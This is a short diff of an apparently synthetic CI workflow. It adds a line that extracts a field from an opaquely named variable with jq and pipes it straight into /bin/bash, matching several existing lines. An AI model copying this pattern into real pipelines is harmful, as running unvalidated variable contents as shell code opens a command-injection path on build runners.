@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$ltaqd2" | jq -r .qe1092 | /bin/bash
           printf '%s' "$t5" | jq -r .ul84 | /bin/bash
           printf '%s' "$drith717" | jq -r .v86 | /bin/bash
+          echo $hzom2 | jq -r .jqz72903 | /bin/bash
 
       - name: Persist output
         if: ${{ always() }}
